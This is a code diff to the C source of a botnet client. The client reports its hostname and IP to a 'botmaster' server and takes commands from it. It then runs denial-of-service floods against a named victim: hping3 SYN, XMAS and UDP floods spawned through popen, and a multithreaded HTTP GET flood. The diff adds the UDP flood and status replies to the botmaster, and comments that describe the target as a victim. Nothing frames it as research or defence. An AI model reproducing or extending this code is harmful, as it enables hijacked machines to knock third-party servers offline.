@@ -23,7 +23,7 @@ void* httpthread(void* dstip)
 	char page[30];
 	char host[30];
 
-	// socket create and varification
+	// socket create and verification
 	sockfd = socket(AF_INET, SOCK_STREAM, 0);
 	if (sockfd == -1) {
 		printf("socket creation failed...\n");
@@ -38,7 +38,7 @@ void* httpthread(void* dstip)
 	servaddr.sin_addr.s_addr = inet_addr((char*)dstip);
 	servaddr.sin_port = htons(80);
 
-	// connect the client socket to server socket
+	// connect the client socket to victim server socket
 	if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
 		printf("connection with the server failed...\n");
 		exit(0);
@@ -46,15 +46,12 @@ void* httpthread(void* dstip)
 	else
 		printf("connected to the server..\n");
 
-	// function for chat
 
+	//Send the HTTP get command
 	write(sockfd, "GET /\r\n", strlen("GET /\r\n"));
-	bzero(sendline,sizeof(sendline));
-	while(read(sockfd, sendline, MAX - 1) != 0){
-		fprintf(stderr, "%s", sendline);
-		bzero(sendline, MAX);
-	}
+	
 
+	//Skip the returned message
 	// close the socket
 	shutdown(sockfd, SHUT_RDWR); 
 
@@ -63,18 +60,24 @@ void* httpthread(void* dstip)
 	close(sockfd);
 	pthread_exit(NULL);
 }
+
+
 void httpdos(char* dstip, int count)
 {
 	pthread_t threadid[50];
 	int i=0;
 	count = count>50?50:count;
+
+	//For each HTTP connection, we create a separate thread
 	while(i<count)
 	{
 		pthread_create(&threadid[i], NULL, httpthread,dstip);
 		i++;
 	}
 	int k=0;
-	while(k<=i)
+
+	//Wait for all threads to terminate
+	while(k<i)
 	{
 		pthread_join(threadid[k++],NULL);
 	}
@@ -84,6 +87,8 @@ int execute(int s,char* cmd, char* dstip, int count)
 	char statement[200];
 	char response[10240], msg[10240];
 	int length;
+
+	//Create statement based on attack-type
 	if(strcmp(cmd,"TCP-SYN")==0)
 	{
 		sprintf(statement,"hping3 %s --syn -c %d",dstip, count);
@@ -97,20 +102,28 @@ int execute(int s,char* cmd, char* dstip, int count)
 	{
 		sprintf(statement,"hping3 %s --xmas -c %d",dstip, count);
 	}
+	else if(strcmp(cmd, "UDP") == 0)
+	{
+		sprintf(statement, "hping3 -2 %s -c %d",dstip, count);
+	}
 	else if(strcmp(cmd,"HTTP") == 0)
 	{
+		//HTTP attack has to be done separately
 		httpdos(dstip,count);
+		sprintf(msg,"Success");
+		resp(s,msg, sizeof(msg));
 		return;
 	}
 	else
 	{
-		sprintf(msg,"Incorrect command type passed");
-		//resp(s,msg, sizeof(msg));
+		sprintf(msg,"Failure");
+		resp(s,msg, sizeof(msg));
 		return;
 	}
-	//printf("%s,statement")
+
+	//In all other cases other than HTTP attack
+	//execute and send success message
 	FILE* fp = popen(statement,"r");
-	//sleep(10);
 	if(fp == NULL)
 	{
 		printf("\nUnable to Spawn process");
@@ -121,33 +134,22 @@ int execute(int s,char* cmd, char* dstip, int count)
 	{
 		strcat(msg,response);
 	}
-	//free(response);
-	//printf("%s",msg);
-	//resp(s,msg,sizeof(msg));
+	sprintf(msg,"Success");
+	resp(s,msg, sizeof(msg));
 	pclose(fp);
-	//system(cmd);
 	return;
 }
 int parse(int s, char* msg)
 {
-	/*char* cmd = strchr(msg,':');
-	if(cmd == NULL)
-	{
-		printf("Incorrect format");
-		return -1;
-	}
-	cmd++;
-	printf("\n%s\n",cmd);
-	execute(s,cmd);*/
 	char string[50];
 	char* cmd, *dstip, *token;
 	int count, n =0;
 	strcpy(string, msg);
+
+	//Extract the attack-type, IP and count fields from the command
 	token = strtok(string, " ");
-	//exit(0);
 	while(token!=NULL)
 	{
-		
 		switch(n)
 		{
 			case 1:
@@ -163,16 +165,18 @@ int parse(int s, char* msg)
 		token = strtok(NULL," ");
 		n++;
 	}
+
+	//If no error in number of tokens, execute the command
 	if(n==4)
 	{
 		execute(s,cmd,dstip,count);
 		return 0;
 	}
+	//Else return a failure message
 	else
 	{
-		strcpy(string,"Incorrect message");
-		//write(s,msg,strlen(msg));
-		//exit(0);
+		strcpy(string,"Failure");
+		write(s,msg,strlen(msg));
 		return 0;
 	}
 		
@@ -182,16 +186,6 @@ void resp(int s, char* msg,long int size)
 {
 	//bzero(msg,sizeof(msg));
 	write(s,msg,size);
-}
-
-void receive(int s, char*msg)
-{
-	bzero(msg,sizeof(msg));
-	read(s,msg,sizeof(msg));
-	FILE* fp = fopen("storage.txt","w");
-	fprintf(fp,"%s",msg);
-	fclose(fp);
-	//exit(0);
 }
 
 void check_host_entry(struct hostent * hostentry) { //find host info from host name
@@ -207,40 +201,34 @@ void func(int sockfd)
 	char* ip;
 	struct hostent *host_entry;
 	int n=5;
+
+	//Obtain the hostname and ip of the device
 	bzero(buff,sizeof(buff));
 	gethostname(buff,sizeof(buff));
 	host_entry = gethostbyname(buff);
 	check_host_entry(host_entry);
 	ip = inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0]));
-	//strcpy(buff,ip);
-	//exit(0);
-	//printf("%s",ip);
-	//exit(0);
+
+	//Send the hostname to the botmaster
 	resp(sockfd,buff,sizeof(buff));
+
+	//Send the IP address to the botmaster
 	bzero(buff,sizeof(buff));
 	strcpy(buff,ip);
 	resp(sockfd, ip, strlen(ip));
-	for (;;) {
-		//bzero(buff, sizeof(buff));
-		/*printf("Enter the string : ");
-		n = 0;
-		while ((buff[n++] = getchar()) != '\n')
-			;*/
-		//write(sockfd, buff, sizeof(buff));
+
+
+	for (;;) 
+	{
+		//Receive commands from the botmaster
 		bzero(buff, sizeof(buff));
 		read(sockfd, buff, sizeof(buff));
-		//receive(sockfd,buff);
-		
-		//FILE*fp  = fopen("storage.txt","r");
-		//bzero(temp,sizeof(temp));
-		//fscanf(fp,"%s",temp);
-		//fscanf(fp,"%[^\n]*c",temp);
-		//fclose(fp);
 		printf("From Server,%d : %s", sizeof(buff),buff);
 		if ((strncmp(buff, "exit", 4)) == 0) {
 			printf("Client Exit...\n");
 			break;
 		}
+		//Parse and execute the command
 		parse(sockfd,buff);
 	}
 }
@@ -250,7 +238,7 @@ int main()
 	int sockfd, connfd;
 	struct sockaddr_in servaddr, cli;
 
-	// socket create and varification
+	// socket create and verfification
 	sockfd = socket(AF_INET, SOCK_STREAM, 0);
 	if (sockfd == -1) {
 		printf("socket creation failed...\n");
@@ -273,7 +261,7 @@ int main()
 	else
 		printf("connected to the server..\n");
 
-	// function for chat
+	// function for command
 	func(sockfd);
 
 	// close the socket
